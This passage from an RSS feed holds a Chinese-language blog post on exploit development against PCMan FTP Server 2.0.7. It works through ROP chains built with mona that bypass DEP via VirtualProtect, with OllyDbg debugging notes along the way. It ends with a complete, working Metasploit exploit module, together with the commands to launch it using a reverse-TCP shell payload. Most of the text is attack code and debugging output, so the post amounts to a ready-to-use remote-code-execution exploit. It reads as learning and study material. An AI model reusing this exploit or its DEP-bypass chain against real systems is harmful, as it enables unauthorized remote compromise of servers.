发现9个nop还是会被填充成随机数据(后来发现不是被win7x64系统的安全保护填充的,而是因为msf自带的nop有好几种,不只是9090,其他应该是类似的花指令),\xcc到是一直没有被改写,试着不要9个nop了,将原来rop_gadges中的pushad+retn指令的地址改成一条jmp esp指令的地址,并在该地址后接payload数据,上面的dep off时的exploit.rb中的jmp esp的地址76061b1b在dep on时为call esp汇编语句的地址,不用在od中查找其他的了,call esp也可跳到后面的pyaload执行

发送如下的rop_gadgets数据+不要nop+不要\xcc的数据到pcmanftp:

---------------sploit data-------------
def create_rop_chain()
        rop_gadgets = 
        [
          0x778a45e1,  # POP ECX # RETN [knb3rdhmpg.dll] 
          0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
          0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
          0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
          0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
          0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
          0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
          0xfffffdff,  # Value to negate, will become 0x00000201
          0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
          0x756bd259,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
          0x74923ca7,  # POP EAX # RETN [knb3rdhmpg.dll] 
          0xffffffc0,  # Value to negate, will become 0x00000040
          0x76cc4402,  # NEG EAX # RETN [winrnr.dll] 
          0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
          0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
          0x7647d27c,  # &amp;amp;Writable location [USP10.dll]
          0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
          0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
          0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
          0x90909090,  # nop
          #0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
          0x76061b1b,  #call esp
        ].flatten.pack(&quot;V*&quot;)
        return rop_gadgets
      end


      def exploit
        connect_login
    
        print_status(&#39;Generating payload...&#39;)
        sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
        sploit &amp;lt;&amp;lt; create_rop_chain()
        #sploit &amp;lt;&amp;lt; make_nops(9)
        #sploit &amp;lt;&amp;lt; &quot;\x41&quot;*30
        #sploit &amp;lt;&amp;lt; &quot;\xcc&quot;
        sploit &amp;lt;&amp;lt; payload.encoded
    
        tmp=sploit
        print_status(tmp)
    
        send_cmd( [&quot;ls&quot;, sploit], false )
        disconnect
      end
    end
-------------------end-----------------

再次跟踪到rop_gadges中的第一个地址,再f8直到上面sploit变量中的rop_gadget中的最后一个地址call esp的地址处程序报错,异常偏移为00a31b1b,难道是rop_gadgets中的地址串执行后没有实现后面的payload为栈中可执行?

再次跟踪到rop_gadgets中的所有地址,发现最后jmp esp执行后程序报错,报出0018edb8处为异常偏移,而0018edb8处为payload开始的对应的堆栈窗口中地址,且每次0018edb8中的数据都不同,难道连payload都被随机数填充了?

有比较大的可能性是执行完上面的rop_gadgets中的地址对应的指令后没有实现payload在栈中可执行,难道是不应该把mona生成的rop_gadges中的最后的pushad+retn对应的地址换成jmp esp的地址?

再看看相关mona的资料,后面的pushad + retn应该是存在的,具体原因见下图virtualprotect_rop中所示
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图virtualprotect_rop
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/virtualprotect_rop.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mona生成的rop_gadgets中的最后一句中的pushad+retn指令的地址是必须的,正是通过pushad+retn的执行才可以导致virtualprotect的执行,实现的原理是在pushad之前将pushad的各个寄存器按照对应的顺序设置成刚好可以调用virtualprotect函数使后面的shellcode为可执行
后来调试在进入virtualprotect_rop前最后一个函数00403e60的返回语句是retn 4而不是retn,所以rop_gadgets中的第一个地址后要加一个过渡的值,这里取为0x41414141

----------------------------00403e60--------------------------------
    00402A26    E8 35140000     call PCManFTP.00403E60
    00402A2B    8A46 03         mov al,byte ptr ds:[esi+0x3]
    
        
        00403E60    A1 40354400     mov eax,dword ptr ds:[0x443540]
        00403E65    81EC 14080000   sub esp,0x814
        00403E6B    85C0            test eax,eax
        ...
        ...
        ...
        00403FB1    5F              pop edi                                  ; kernel32.77032C3B
        00403FB2    5E              pop esi                                  ; kernel32.77032C3B
        00403FB3    81C4 14080000   add esp,0x814
        00403FB9    C2 0400         retn 0x4
-------------------------------end-----------------------------------

在mona生成的最后rop_chains.txt文件中有virutalalloc过dep的rop_gadgets,也有virtualprotect过dep的rop_gadgets,刚开始以为是mona出错了,后来发现是用到了mona里面的virtualalloc过dep方式
0day2中提到下面几种方法过dep:
1.ZwSetInformationProcess:利用api彻底关闭dep
2.VirtualProtect:利用api设置shellcode所在的内存空间为可执行
3.VirtualAlloc:利用api申请可执行内存后将shellcode复制过去(需再用memcopy的api)
4.利用可执行内存挑战dep
5.利用.NET挑战dep
6.利用Java applet挑战dep
这里用的是2中的virtualprotect中的方法,mona生成的virtualalloc的方法应该是缺少了memcopy的chain,导致刚开始一直错误地以为mona错了
最后再用mona生成的rop_gadgets如下:(第二个地址为新添加的0x41414141)
--------------------new_rop_gadgets--------------------
    rop_gadgets = 
    [
      0x77032c3b,  # POP EAX # RETN [kernel32.dll] 
      0x41414141,  # added data to fit retn 4 from func 00403e60
      0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
      0x76bb4412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll] 
      0x76408d2a,  # XCHG EAX,ESI # RETN [SHLWAPI.dll] 
      0x76b607f0,  # POP EBP # RETN [msvcrt.dll] 
      0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
      0x7368b031,  # POP EAX # RETN [COMCTL32.dll] 
      0xffffddff,  # Value to negate, will become 0x00000201
      0x756c9a5c,  # NEG EAX # RETN [SHELL32.dll] 
      0x767088bd,  # XCHG EAX,EBX # RETN [RPCRT4.dll] 
      0x77031d7b,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76cc4402,  # NEG EAX # RETN [SHELL32.dll] 
      0x76b4ad98,  # XCHG EAX,EDX # RETN [SHELL32.dll] 
      0x756b1cc1,  # POP ECX # RETN [SHELL32.dll] 
      0x7647c663,  # &amp;amp;Writable location [USP10.dll]
      0x73756cf3,  # POP EDI # RETN [COMCTL32.dll] 
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x76b3f5d4,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      0x7366e16f,  # PUSHAD # RETN [COMCTL32.dll] 
    ].flatten.pack(&quot;V*&quot;)
------------------------end----------------------------
再次开msf发payload,od附加,调试时发现如下图ebx_error错误
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;图ebx_error
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/ebx_error.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;后来发现原来的mona中的virtualprotect是获得0x201(对应上面的0xffffddff,neg取反后为0x201)个可执行栈空间,以为是msf中的payload比这个长导致shellcode执行出错,后来将这个值设置为0xffffddff后没能关掉dep,应该是由于长度太大或许超过了栈空间的大小而导致virtualprotect函数的失败,于是没能成功关掉dep

后来将这个值设置成0xfffffaff(neg取反后的结果比0x201大),又可以关掉dep了,只是后面的shellcode执行还是不成功

怀疑有可能是像上图ebx_error中说的是ebx错了,也有可能是像0day2中说的ebp在溢出的过程中被破坏,这些只有再次从od中动态分析才可知

后来还是自己想多了,mona之所以称为神器,在于的确是神器,怎会轻易出错

换个payload马上成功,对msf还是不够熟悉！！一个payload不行可以换啊！！

最后的exploit.rb如下,改成mypcmanftp-anti-dep.rb,放到/msfdirectory/modules/exploit/windows/my/目录下后执行下面的命令:
use exploit/windows/my/mypcmanftp-anti-dep
set payload windows/shell/reverse_tcp_rc4
set RC4PASSWORD mypassword
exploit
成功弹shell
----------------------------exploit.rb-------------------------------
    # This module requires Metasploit: http://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    require &#39;msf/core&#39;
    
    class Metasploit3 &amp;lt; Msf::Exploit::Remote
      Rank = NormalRanking
    
      include Msf::Exploit::Remote::Ftp
    
      def initialize(info = {})
        super(update_info(info,
          &#39;Name&#39;           =&amp;gt; &#39;PCMAN FTP Server Buffer Overflow - PUT Command&#39;,
          &#39;Description&#39;    =&amp;gt; %q{
              This module exploits a buffer overflow vulnerability found in the PUT command of the
              PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
              credientials are enabled.
          },
          &#39;Author&#39;         =&amp;gt;
              [
                &#39;quanyechavshuo&#39;
              ],
          &#39;License&#39;        =&amp;gt; MSF_LICENSE,
          &#39;References&#39;     =&amp;gt;
            [
              [ &#39;EDB&#39;,   &#39;37731&#39;],
              [ &#39;OSVDB&#39;,   &#39;94624&#39;]
            ],
          &#39;DefaultOptions&#39; =&amp;gt;
            {
              &#39;EXITFUNC&#39; =&amp;gt; &#39;process&#39;
            },
          &#39;Payload&#39;        =&amp;gt;
            {
              &#39;Space&#39;   =&amp;gt; 1000,
              &#39;BadChars&#39;  =&amp;gt; &quot;\x00\x0A\x0D&quot;,
            },
          &#39;Platform&#39;       =&amp;gt; &#39;win&#39;,
          &#39;Targets&#39;        =&amp;gt;
            [
              [ &#39;windows 7 x64&#39;,
                {
                  &#39;Ret&#39; =&amp;gt; 0x77636aeb, # jmp esp C:\WINDOWS\system32\ntdll.dll
                  &#39;Offset&#39; =&amp;gt; 2008
                }
              ],
            ],
          &#39;DisclosureDate&#39; =&amp;gt; &#39;Aug 07 2015&#39;,
          &#39;DefaultTarget&#39;  =&amp;gt; 0))
      end
    
      def check
        connect_login
        disconnect
    
        if /220 PCMan&#39;s FTP Server 2\.0/ === banner
          Exploit::CheckCode::Appears
        else
          Exploit::CheckCode::Safe
        end
      end

  def create_rop_chain()
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x77032c3b,  # POP EAX # RETN [kernel32.dll] 
      0x41414141,
      0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
      0x76bb4412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll] 
      0x76408d2a,  # XCHG EAX,ESI # RETN [SHLWAPI.dll] 
      0x76b607f0,  # POP EBP # RETN [msvcrt.dll] 
      0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
      0x7368b031,  # POP EAX # RETN [COMCTL32.dll] 
      0xfffffaff,  # Value to negate, will become 0x00000201
      0x756c9a5c,  # NEG EAX # RETN [SHELL32.dll] 
      0x767088bd,  # XCHG EAX,EBX # RETN [RPCRT4.dll] 
      0x77031d7b,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76cc4402,  # NEG EAX # RETN [SHELL32.dll] 
      0x76b4ad98,  # XCHG EAX,EDX # RETN [SHELL32.dll] 
      0x756b1cc1,  # POP ECX # RETN [SHELL32.dll] 
      0x7647c663,  # &amp;amp;Writable location [USP10.dll]
      0x73756cf3,  # POP EDI # RETN [COMCTL32.dll] 
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x76b3f5d4,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop 
      0x7366e16f,  # PUSHAD # RETN [COMCTL32.dll] 

    ].flatten.pack(&quot;V*&quot;)

    return rop_gadgets

  end


      def exploit
        connect_login
    
        print_status(&#39;Generating payload...&#39;)
        sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
        sploit &amp;lt;&amp;lt; create_rop_chain()
        #sploit &amp;lt;&amp;lt; make_nops(9) 这句产生的nop并非90
        sploit &amp;lt;&amp;lt; &quot;\x90&quot;*30
        #sploit &amp;lt;&amp;lt; &quot;\x41&quot;*30
        #sploit &amp;lt;&amp;lt; &quot;\xcc&quot;
        sploit &amp;lt;&amp;lt; payload.encoded
    
        #tmp=sploit
        tmp=make_nops(9)
        print_status(tmp)
    
        send_cmd( [&quot;ls&quot;, sploit], false )
        disconnect
      end
    
    end

-------------------------------end-----------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/succeed.png&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 13 Jun 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/13/pcman-ftp%E5%88%9D%E6%88%98%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/13/pcman-ftp%E5%88%9D%E6%88%98%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</guid>
        
        <category>ftp</category>
        
        <category>挖洞</category>
        
        
        <category>二进制</category>
        
      </item>
    
  </channel>
</rss>
